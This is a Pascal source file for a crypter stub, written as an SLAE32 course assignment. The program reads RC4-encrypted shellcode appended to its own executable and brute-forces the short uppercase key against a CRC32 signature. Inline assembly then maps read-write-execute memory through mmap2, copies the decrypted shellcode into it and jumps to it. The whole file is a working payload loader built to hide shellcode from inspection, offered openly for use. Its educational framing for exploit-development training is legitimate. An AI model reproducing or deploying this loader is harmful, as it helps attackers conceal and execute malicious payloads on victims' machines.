{*******************************************************************************

        Jean-Pierre LESUEUR (@DarkCoderSc)
        www.phrozen.io
        SLAE32 - Assignment N°7 Crypters.
        Compiled with Lazarus.

*******************************************************************************}

program stub;

uses UntEOF       in '../shared/UntEOF.pas',
     UntRC4       in '../shared/UntRC4.pas',
     UntCRC32     in '../shared/UntCRC32.pas',
     UntFunctions in '../shared/UntFunctions.pas',
     SysUtils;

var AEOF           : TEOF;
    ARC4           : TRC4;
    pSignature     : PCardinal;
    ADataSize      : Cardinal;
    pShellcode     : Pointer;
    ABruteforced   : Boolean;
    pKeyLen        : PCardinal;

{-------------------------------------------------------------------------------
    Brute Force Encryption Key (Recursive)
-------------------------------------------------------------------------------}
procedure ForceDecryptRC4(AKeyLength : Cardinal; ACandidate : String = '');
var i : Integer;
    n : Integer;
    p : Pointer;
begin
  if ABruteForced then
    Exit();
  ///

  if (NOT Assigned(pShellcode)) or (ADataSize = 0) then
    Exit();
  ///

  for i := 65 to 90 do begin
    if (Length(ACandidate)+1 <= (AKeyLength-1)) then
        ForceDecryptRC4(AKeyLength, (ACandidate + chr(i)))
    else begin
        if NOT Assigned(ARC4) then
            ARC4 := TRC4.Create(CRC32h(ACandidate + chr(i)))
        else
            ARC4.UpdatePassphrase(CRC32h(ACandidate + chr(i)));
        ///

        p := GetMem(ADataSize);
        try
            Move(PByte(pShellcode)^, PByte(p)^, ADataSize);
            ///

            case ARC4.Decrypt(p, ADataSize, pSignature^) of
                rSuccess : begin
                    Move(PByte(p)^, PByte(pShellcode)^, ADataSize);

                    ABruteForced := True;
                end;
            end;
        finally
            FreeMem(p, ADataSize);
        end;
    end;
  end;
end;

{-------------------------------------------------------------------------------
    Program Entry Point
-------------------------------------------------------------------------------}
begin
  pShellCode   := nil;
  pSignature   := nil;
  ADataSize    := 0;
  ARC4         := nil;
  ABruteforced := False;
  ///

  {
    Read EOF Data
  }
  try
    try
      AEOF := TEOF.Create(ParamStr(0), TEOFMode.eofRead);
      try
        pSignature := AEOF.Get(1, ADataSize);
        if NOT Assigned(pSignature) then
            raise Exception.Create('Could not read signature from EOF.');
        ///

        pKeyLen := AEOF.Get(2, ADataSize);
        if NOT Assigned(pKeyLen) then
            raise Exception.Create('Could not read key length.');
        ///

        pShellCode := AEOF.Get(3, ADataSize);

        WriteLn(Format('Shellcode Loaded, Length=[%d], CRC32_Signature=[%d (0x%s)]', [
                ADataSize,
                pSignature^,
                IntToHex(pSignature^, 8)
        ]));

        WriteLn('Shellcode Dump (Encrypted):');
        DumpMemory(pShellcode, ADataSize);
        WriteLn('---');
      finally
        if Assigned(AEOF) then
            FreeAndNil(AEOF);
      end;

      {
          Decrypt Shellcode (Bruteforce)
      }
      ForceDecryptRC4(pKeyLen^);
      if ABruteforced then begin
          WriteLn('Passphrase successfully cracked.');

          WriteLn('Shellcode Dump (Decrypted/Plain):');
          DumpMemory(pShellcode, ADataSize);
          WriteLn('---');
      end else
          raise Exception.Create('Could not crack RC4 passphrase.');

      {
          Run Shellcode
      }
      {$ASMMODE Intel}
      asm
        {
            Clean Registers (EAX, EBX, ECX, EDX, ESP)
            Even if it is not required in our specific case it is always
            a good idea, even for debugging.
        }
        xor ecx, ecx
        xor ebx, ebx
        xor ebp, ebp
        mul ecx

        {
            mmap2() Syscall to host our Shellcode
        }
        mov eax, $c0           // mmap2() syscall
        mov ecx, [ADataSize]   // Size of shellcode
        mov edx, $7            // PROT_READ | PROT_WRITE | PROT_EXEC
        mov esi, $22           // MAP_PRIVATE | MAP_ANONYMOUS
        mov edi, $ffffffff     // File Descriptor (-1)

        int $80                // call syscall

        {
            Copy shellcode to new memory region (Executable region)
        }
        mov esi, pShellcode
        mov edi, eax
        xor eax, eax

        @mem_copy:
            mov al, [esi]
            mov [edi], al

            inc si
            inc di

            loop @mem_copy

        {
            Execute Shellcode
        }
        sub edi, [ADataSize]
        call edi
      end;
    except
      on E : Exception do
          WriteLn('[-] ' + E.Message);
    end;
  finally
    {
        Cleanup (If something fail before shellcode execution, we clean memory)
    }
    if Assigned(pSignature) then
        FreeMem(pSignature, SizeOf(Cardinal));

    if Assigned(pKeyLen) then
        FreeMem(pKeyLen, SizeOf(Cardinal));

    if Assigned(pShellcode) then
        FreeMem(pShellcode, ADataSize);

    if Assigned(ARC4) then
        FreeAndNil(ARC4);
  end;

end.
